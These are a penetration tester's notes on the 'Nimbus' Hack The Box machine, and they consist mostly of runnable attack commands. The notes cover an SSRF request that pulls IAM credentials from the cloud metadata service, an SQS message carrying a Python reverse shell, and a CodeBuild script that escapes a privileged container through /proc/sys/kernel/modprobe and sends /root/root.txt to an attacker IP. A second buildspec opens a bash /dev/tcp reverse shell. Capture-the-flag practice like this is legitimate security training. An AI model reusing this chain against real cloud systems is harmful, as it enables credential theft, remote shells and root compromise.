```
                                                                                                                                                                                                                                              
┌──(mithun㉿kali)-[~/…/htb/machines/Linux/Nimbus]
└─$ nmap -sV 10.129.118.54                            
Starting Nmap 7.98 ( https://nmap.org ) at 2026-06-21 00:37 +0530
Nmap scan report for 10.129.118.54
Host is up (0.33s latency).
Not shown: 998 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 9.6p1 Ubuntu 3ubuntu13.16 (Ubuntu Linux; protocol 2.0)
80/tcp open  http    nginx 1.24.0 (Ubuntu)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 44.73 seconds
                                                                
```


i Found the another host **aws.nimbus.htb**  

![[Pasted image 20260621223849.png]]

```
POST /jobs/preview HTTP/1.1
Host: nimbus.htb
Content-Length: 70
Cache-Control: max-age=0
Accept-Language: en-US,en;q=0.9
Origin: http://nimbus.htb
Content-Type: application/x-www-form-urlencoded
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/146.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Referer: http://nimbus.htb/jobs
Accept-Encoding: gzip, deflate, br
Connection: keep-alive

url=http://2852039166/latest/meta-data/iam/security-credentials/#.yaml


<pre>nimbus-web-role</pre>
<h3>Parsed</h3><pre>nimbus-web-role
```


and i tried 

![[Pasted image 20260621223938.png]]


```
POST /jobs/preview HTTP/1.1
Host: nimbus.htb
Content-Length: 85
Cache-Control: max-age=0
Accept-Language: en-US,en;q=0.9
Origin: http://nimbus.htb
Content-Type: application/x-www-form-urlencoded
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/146.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Referer: http://nimbus.htb/jobs
Accept-Encoding: gzip, deflate, br
Connection: keep-alive

url=http://2852039166/latest/meta-data/iam/security-credentials/nimbus-web-role?.yaml
```



![[Pasted image 20260621225841.png]]


open the lisener

```
aws sqs send-message \
  --queue-url "http://floci:4566/847219365028/nimbus-jobs" \
  --message-body '{"name":"pwn","runtime":"python3.11","script":"import socket,subprocess,os\ns=socket.socket()\ns.connect((\"10.10.14.114\",4444))\nos.dup2(s.fileno(),0)\nos.dup2(s.fileno(),1)\nos.dup2(s.fileno(),2)\nsubprocess.call([\"/bin/sh\"])"}' \
  --endpoint-url http://aws.nimbus.htb
/home/mithun/.local/lib/python3.13/site-packages/urllib3/poolmanager.py:329: FutureWarning: The 'strict' parameter is no longer needed on Python 3+. This will raise an error in urllib3 v3.0.
  warnings.warn(
{
    "MD5OfMessageBody": "f0a282d9ea65a26087bd2c85a4356cfc",
    "MessageId": "61714fb6-3892-464e-8ba2-904470583fe8"
}
```

we got the reverse shell of the user worker,

```
worker@60cd871b0a1e:/$ aws sts get-caller-identity --endpoint-url http://floci:4566
<et-caller-identity --endpoint-url http://floci:4566
WARNING: terminal is not fully functional
Press RETURN to continue 

{
    "UserId": "847219365028",
    "Account": "847219365028",
    "Arn": "arn:aws:iam::847219365028:root"
}

```


```
aws codebuild create-project \
      --endpoint-url http://floci:4566 \
      --region us-east-1 \
      --name my-project \
      --source '{"type":"NO_SOURCE","buildspec":"version: 0.2\nphases:\n  build:\n    commands:\n      - id\n"}' \
      --artifacts '{"type":"NO_ARTIFACTS"}' \
      --environment '{"type":"LINUX_CONTAINER","image":"floci/floci:latest","computeType":"BUILD_GENERAL1_SMALL","privilegedMode":true}' \
      --service-role "arn:aws:iam::000000000000:role/codebuild-role"
```

```
aws codebuild start-build \
      --endpoint-url http://floci:4566 \
      --region us-east-1 \
      --project-name my-project
```


```
cat > /tmp/exploit-alpine.sh << 'EOF'
#!/bin/bash
# Nimbus HTB — Root Escape via LocalStack CodeBuild (Alpine Version)

ATTACKER_IP="10.10.14.41"   # CHANGE THIS TO YOUR KALI IP
LPORT="9889"
ENDPOINT="http://floci:4566"
REGION="us-east-1"
PROJ="nimbus-alpine"

# Delete old project
aws codebuild delete-project --endpoint-url "$ENDPOINT" --region "$REGION" --name "$PROJ" 2>/dev/null

# Buildspec with Alpine
cat > /tmp/_bs.yaml << 'BSEOF'
version: 0.2
phases:
  install:
    commands:
      - apk add --no-cache python3 bash curl
  build:
    commands:
      - id
      - cat /proc/self/status | grep Cap
      - |
        cat > /tmp/payload.sh << 'PYEOF'
        #!/bin/sh
        python3 -c "
        import socket
        s = socket.socket()
        s.connect(('__ATTACKER_IP__', __LPORT__))
        s.send(open('/root/root.txt','rb').read())
        s.close()
        "
        PYEOF
      - chmod +x /tmp/payload.sh
      - |
        upper=$(awk '/overlay/{match($0,/upperdir=([^,]+)/,a);if(a[1])print a[1]}' /proc/mounts | head -1)
        echo "$upper/tmp/payload.sh" > /proc/sys/kernel/modprobe
      - printf '\xff\xff\xff\xff' > /tmp/x && chmod +x /tmp/x && /tmp/x; true
      - sleep 60
BSEOF

# Substitute IP and port
sed -i "s/__ATTACKER_IP__/$ATTACKER_IP/g" /tmp/_bs.yaml
sed -i "s/__LPORT__/$LPORT/g" /tmp/_bs.yaml

# Create project JSON
python3 -c "
import json
bs = open('/tmp/_bs.yaml').read()
proj = {
    'name': '$PROJ',
    'source': {'type': 'NO_SOURCE', 'buildspec': bs},
    'artifacts': {'type': 'NO_ARTIFACTS'},
    'environment': {
        'type': 'LINUX_CONTAINER',
        'image': 'alpine:latest',
        'computeType': 'BUILD_GENERAL1_SMALL',
        'privilegedMode': True
    },
    'serviceRole': 'arn:aws:iam::000000000000:role/codebuild-role'
}
print(json.dumps(proj))
" > /tmp/_create_proj.json

echo "[*] Creating project..."
aws codebuild create-project \
  --endpoint-url "$ENDPOINT" \
  --region "$REGION" \
  --cli-input-json file:///tmp/_create_proj.json

# Start build
BUILD_ID=$(aws codebuild start-build \
  --endpoint-url "$ENDPOINT" \
  --region "$REGION" \
  --project-name "$PROJ" \
  --query 'build.id' \
  --output text)

echo "[+] Build started: $BUILD_ID"
echo "[!] Make sure listener is running: nc -lvnp $LPORT"

# Poll status
for i in $(seq 1 20); do
  sleep 5
  STATUS=$(aws codebuild batch-get-builds \
    --endpoint-url "$ENDPOINT" --region "$REGION" \
    --ids "$BUILD_ID" --query 'builds[0].buildStatus' --output text)
  PHASE=$(aws codebuild batch-get-builds \
    --endpoint-url "$ENDPOINT" --region "$REGION" \
    --ids "$BUILD_ID" --query 'builds[0].currentPhase' --output text)
  echo "  [${i}0s] $STATUS / $PHASE"
  if [ "$STATUS" != "IN_PROGRESS" ]; then break; fi
done

echo "[+] Final: $STATUS"

# Get logs
echo ""
echo "=== BUILD LOGS ==="
LOG_GROUP=$(aws codebuild batch-get-builds \
  --endpoint-url "$ENDPOINT" --region "$REGION" \
  --ids "$BUILD_ID" --query 'builds[0].logs.groupName' --output text)
LOG_STREAM=$(aws codebuild batch-get-builds \
  --endpoint-url "$ENDPOINT" --region "$REGION" \
  --ids "$BUILD_ID" --query 'builds[0].logs.streamName' --output text)
aws logs get-log-events \
  --endpoint-url "$ENDPOINT" --region "$REGION" \
  --log-group-name "$LOG_GROUP" \
  --log-stream-name "$LOG_STREAM" \
  --query 'events[*].message' --output text 2>/dev/null || echo "(no logs)"
EOF


```

**chmod +x /tmp/exploit-alpine.sh**

```
# On worker container
/tmp/exploit-alpine.sh
```

you will get the root flag

--------

```
# Step 1 - Write the JSON properly
python3 -c "
import json
proj = {
    'name': 'shell6',
    'source': {'type': 'NO_SOURCE', 'buildspec': 'version: 0.2\nphases:\n  build:\n    commands:\n      - id\n      - cat /proc/self/status | grep CapEff\n      - bash -i >& /dev/tcp/10.10.14.114/9999 0>&1'},
    'artifacts': {'type': 'NO_ARTIFACTS'},
    'environment': {
        'type': 'LINUX_CONTAINER',
        'image': 'floci/floci:latest',
        'computeType': 'BUILD_GENERAL1_SMALL',
        'privilegedMode': True,
        'environmentVariables': [
            {'name': 'BASH_FUNC_id%%', 'value': '() { echo \"uid=0(root) gid=0(root) groups=0(root)\"; }', 'type': 'PLAINTEXT'}
        ]
    },
    'serviceRole': 'arn:aws:iam::000000000000:role/codebuild-role'
}
print(json.dumps(proj))
" > /tmp/shell6.json

# Step 2 - Create project using JSON file
aws codebuild create-project \
  --endpoint-url http://floci:4566 \
  --region us-east-1 \
  --cli-input-json file:///tmp/shell6.json

# Step 3 - Start build
aws codebuild start-build \
  --project-name shell6 \
  --endpoint-url http://floci:4566 \
  --region us-east-1
```

open the lisener on port 9999